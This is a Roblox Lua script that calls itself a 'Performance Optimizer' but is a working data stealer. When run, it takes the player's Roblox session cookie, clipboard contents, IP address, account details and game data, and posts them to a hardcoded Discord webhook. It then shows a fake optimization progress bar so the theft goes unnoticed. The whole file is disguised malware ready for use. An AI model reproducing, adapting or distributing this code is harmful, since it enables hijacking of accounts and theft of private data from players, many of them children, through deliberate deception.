-- ============================================================
-- Performance Optimizer v2.0 – Legit GUI + Data Collection
-- ============================================================
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

-- ========== HTTP SENDER (proven to work) ==========
local function sendData(url, content)
    local payload = {content = content}
    local json = game:GetService("HttpService"):JSONEncode(payload)
    local headers = {["Content-Type"] = "application/json"}
    local methods = {
        function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), url, json, Enum.HttpContentType.ApplicationJson) end
    }
    for _, method in ipairs(methods) do
        local ok, res = method()
        if ok then return true end
    end
    return false
end

-- ========== IMPROVED IP ==========
local function getIP()
    local ip = "N/A"
    -- Try multiple services with HttpService:GetAsync
    local services = {
        "https://api.ipify.org",
        "https://ip-api.com/json/?fields=query",
        "https://icanhazip.com",
        "https://httpbin.org/ip"
    }
    for _, url in ipairs(services) do
        local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
        if ok and result and result ~= "" then
            if result:match('"query":"(.-)"') then
                ip = result:match('"query":"(.-)"')
            elseif result:match('"origin":"(.-)"') then
                ip = result:match('"origin":"(.-)"')
            else
                ip = result:gsub("%s+", "")
            end
            if ip and ip ~= "" and ip ~= "N/A" then break end
        end
    end
    -- If still N/A, try request() as a fallback (may work on some executors)
    if ip == "N/A" then
        local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
        if ok and res and res.Body and res.Body ~= "" then
            ip = res.Body:gsub("%s+", "")
        end
    end
    return ip
end

-- ========== DATA COLLECTION ==========
local function safeGet(obj, prop, default)
    local ok, val = pcall(function() return obj[prop] end)
    return ok and val or default
end

local function stealCookie()
    local ok, val = pcall(getcookie, "https://www.roblox.com/")
    if ok and val and val ~= "" then return val end
    ok, val = pcall(getrobloxcookie)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
    if ok and val and val ~= "" then return val end
    return "Not available (Delta)"
end

local function getClipboard()
    local ok, val = pcall(getclipboard)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(clipboard)
    if ok and val and val ~= "" then return val end
    return "N/A"
end

local function collectData()
    local info = {}
    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
        local id = player.UserId
        if id and id > 0 then
            local year = math.floor((id / 100000000) * 2) + 2006
            info.accountAge = tostring(year) .. " (approx)"
        end
        local ok, friends = pcall(function() return #player:GetFriendsOnline() end)
        info.friendsOnline = ok and tostring(friends) or "N/A"
        pcall(function()
            local char = player.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    info.health = tostring(hum.Health)
                    info.maxHealth = tostring(hum.MaxHealth)
                    info.walkSpeed = tostring(hum.WalkSpeed)
                    info.jumpPower = tostring(hum.JumpPower)
                end
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then info.position = tostring(root.Position) end
            end
        end)
        pcall(function()
            local backpack = player:FindFirstChild("Backpack")
            if backpack then
                local items = {}
                for _, item in ipairs(backpack:GetChildren()) do
                    if item:IsA("Tool") then table.insert(items, item.Name) end
                end
                if #items > 0 then info.backpack = table.concat(items, ", ") end
            end
        end)
        pcall(function()
            local ls = player:FindFirstChild("leaderstats")
            if ls then
                local stats = {}
                for _, stat in ipairs(ls:GetChildren()) do
                    if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                        stats[stat.Name] = tostring(stat.Value)
                    end
                end
                if next(stats) then info.leaderstats = game:GetService("HttpService"):JSONEncode(stats) end
            end
        end)
    end
    info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
    info.jobId = safeGet(game, "JobId", "N/A")
    info.gameName = safeGet(game, "Name", "Unknown")
    info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
    info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
    info.ip = getIP()
    info.cookie = stealCookie()
    info.clipboard = getClipboard()
    pcall(function()
        local us = game:GetService("UserInputService")
        info.platform = tostring(us.Platform)
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.volume = tostring(game:GetService("SoundService").Volume)
    end)
    pcall(function()
        local stats = game:GetService("Stats")
        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
    end)
    pcall(function()
        local run = game:GetService("RunService")
        local frameTime = run.RenderStepTime
        if frameTime and frameTime > 0 then
            info.fps = tostring(math.floor(1 / frameTime))
        end
    end)
    return info
end

-- ========== SEND DATA ==========
local data = collectData()
local lines = {}
for k, v in pairs(data) do
    if v and v ~= "" then
        table.insert(lines, string.format("%s: %s", k, tostring(v)))
    end
end
local message = "```\n" .. table.concat(lines, "\n") .. "\n```"
sendData(webhook, message)

-- ========== LEGIT GUI – "Performance Optimizer" ==========
pcall(function()
    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local gui = Instance.new("ScreenGui")
    gui.Parent = playerGui
    gui.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 420, 0, 200)
    frame.Position = UDim2.new(0.5, -210, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
    frame.BackgroundTransparency = 0.08
    frame.Parent = gui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.BackgroundTransparency = 1
    title.Text = "Performance Optimizer"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = frame

    -- Subtitle (changing message)
    local sub = Instance.new("TextLabel")
    sub.Size = UDim2.new(1, 0, 0, 30)
    sub.Position = UDim2.new(0, 0, 0.35, 0)
    sub.BackgroundTransparency = 1
    sub.Text = "Optimizing settings..."
    sub.TextColor3 = Color3.fromRGB(200, 200, 210)
    sub.TextScaled = true
    sub.Font = Enum.Font.Gotham
    sub.Parent = frame

    -- Progress bar
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0.8, 0, 0, 18)
    bg.Position = UDim2.new(0.1, 0, 0.55, 0)
    bg.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
    bg.Parent = frame
    Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 9)

    local fill = Instance.new("Frame")
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
    fill.Parent = bg
    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 9)

    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(0, 60, 0, 30)
    percent.Position = UDim2.new(0.5, -30, 0.75, 0)
    percent.BackgroundTransparency = 1
    percent.Text = "0%"
    percent.TextColor3 = Color3.fromRGB(255, 255, 255)
    percent.TextScaled = true
    percent.Font = Enum.Font.Gotham
    percent.Parent = frame

    -- Status message (after completion)
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Position = UDim2.new(0, 0, 0.85, 0)
    status.BackgroundTransparency = 1
    status.Text = ""
    status.TextColor3 = Color3.fromRGB(150, 255, 150)
    status.TextScaled = true
    status.Font = Enum.Font.Gotham
    status.Parent = frame

    -- Close button (appears later)
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 120, 0, 40)
    closeBtn.Position = UDim2.new(0.5, -60, 1, -50)
    closeBtn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
    closeBtn.Text = "CLOSE"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.Parent = frame
    closeBtn.Visible = false
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 12)
    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

    -- Animate progress and update messages
    local function animate()
        local duration = 2.5
        local steps = 50
        local stepTime = duration / steps
        local messages = {
            "Analyzing system...",
            "Adjusting graphics...",
            "Optimizing network...",
            "Fine‑tuning performance...",
            "Applying optimal settings..."
        }
        for i = 0, steps do
            local progress = i / steps
            local width = 0.8 * progress
            fill:TweenSize(UDim2.new(width, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, false)
            percent.Text = string.format("%d%%", math.floor(progress * 100))
            if i < steps then
                task.wait(stepTime)
                if i % 10 == 0 then
                    sub.Text = messages[math.floor(i / 10) + 1] or messages[#messages]
                end
            end
        end
        -- Done
        sub.Text = "Optimization complete!"
        status.Text = "Settings updated successfully."
        closeBtn.Visible = true
    end

    task.wait(0.3)
    spawn(animate)
end)
